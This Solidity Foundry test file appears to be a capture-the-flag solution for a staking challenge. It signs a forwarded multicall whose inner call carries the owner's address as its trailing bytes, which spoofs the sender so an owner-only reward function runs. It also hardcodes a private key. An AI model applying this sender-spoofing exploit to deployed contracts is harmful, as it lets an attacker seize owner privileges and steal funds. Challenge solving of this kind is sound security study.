// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Challenge} from "src/Wombo/Challenge.sol";
import {Token} from "src/Wombo/Token.sol";
import {Forwarder} from "src/Wombo/Forwarder.sol";
import {Staking} from "src/Wombo/Staking.sol";
import {VmSafe} from "forge-std/Script.sol";
import "@openzeppelin/contracts/utils/Create2.sol";
import {MessageHashUtils} from "lib/openzeppelin-contracts/contracts/utils/cryptography/MessageHashUtils.sol";

contract Solver {
    Challenge challenge;
    Token token;
    Token reward;
    Forwarder forwarder;
    Staking staking;

    constructor(address _challenge) {
        challenge = Challenge(_challenge);
        staking = challenge.staking();
        forwarder = challenge.forwarder();
        token = staking.stakingToken();
        reward = staking.rewardsToken();
    }

    function solve() public {
        token.approve(address(staking), type(uint256).max);
    }
}

contract WomboTest is Test {
    uint256 privateKey = 0x09f06b37dfe2903374d46b2b93c1dc226aee1439ca6ee7d54a1e31435e6160a6;
    address target = 0xaFA43B7E70e98E765bcE9758936B02D6769446a2;
    VmSafe.Wallet wallet;
    address publicAddress;

    Challenge challenge;
    Staking staking;
    Forwarder forwarder;

    Token token;
    Token reward;
    address owner;

    Solver solver;

    uint256 amazingNumber = 1128120030438127299645800;
    bytes32 private constant _FORWARDREQUEST_TYPEHASH = keccak256(
        "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
    );

    function setUp() public {
        token = new Token("Staking", "STK", 100 * 10 ** 18);
        reward = new Token("Reward", "RWD", 100_000_000 * 10 ** 18);

        forwarder = new Forwarder();

        staking = new Staking(token, reward, address(forwarder));

        staking.setRewardsDuration(20);
        reward.transfer(address(staking), reward.totalSupply());
        token.transfer(address(this), token.totalSupply());

        challenge = new Challenge(staking, forwarder);

        solver = new Solver(address(challenge));

        wallet = vm.createWallet(privateKey);
        publicAddress = wallet.addr;

        owner = staking.owner();

        console.log("owner: %s", owner);
    }

    function _testSolve() public {
        _testSignature();

        console.log("amazing Number: %e", amazingNumber); //1e24

        token.approve(address(staking), type(uint256).max);
        console.log("tokenBalance: %e", token.balanceOf(address(this)));
        uint256 tokenBalance = token.balanceOf(address(this));
        staking.stake(tokenBalance);

        console.log("stake Supply: %e", staking.totalSupply());
        
        skip(20);

        staking.getReward();
        console.log("reward %e", reward.balanceOf(address(this)));
        console.log("earned %e", staking.earned(address(this)));

        //transfer all reward token to address 0x123
        reward.transfer(address(0x123), reward.balanceOf(address(this)));

        // token.transfer(address(solver), token.balanceOf(address(this)));
        // solver.solve();
        // need earn amazing number
        // and transfer some rewards token to burn address
        require(challenge.isSolved(), "not solve challenge");
    }

    function _testSignature() internal {
        uint rewardAmount = 20_000_000e18;
        bytes memory fakeCall = abi.encodeWithSignature("notifyRewardAmount(uint256)", rewardAmount);
        bytes memory encodeData = abi.encodePacked(fakeCall, owner);//0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
        //0x3c6b16ab000000000000000000000000000000000000000000108b2a2c280290940000007fa9385be102ac3eac297483dd6233d62b3e1496
        bytes[] memory arrayCall = new bytes[](1);
        arrayCall[0] = encodeData;
        Forwarder.ForwardRequest memory req = Forwarder.ForwardRequest({
            from: publicAddress,
            to: address(staking),
            value: 0,
            gas: 400000,
            nonce: forwarder.getNonce(publicAddress),
            deadline: block.timestamp + 1000,
            data: abi.encodeWithSignature("multicall(bytes[])", arrayCall)
        });//multicall 0xac9650d8

        bytes32 structHash = keccak256(
            abi.encode(
                _FORWARDREQUEST_TYPEHASH,
                req.from,
                req.to,
                req.value,
                req.gas,
                req.nonce,
                req.deadline,
                keccak256(req.data)
            )
        );
        bytes32 digest = MessageHashUtils.toTypedDataHash(forwarder.DOMAIN_SEPARATOR(), structHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(wallet.privateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);
        (bool success, ) =  forwarder.execute(req, signature);

        require(success, "not success");

    }
}
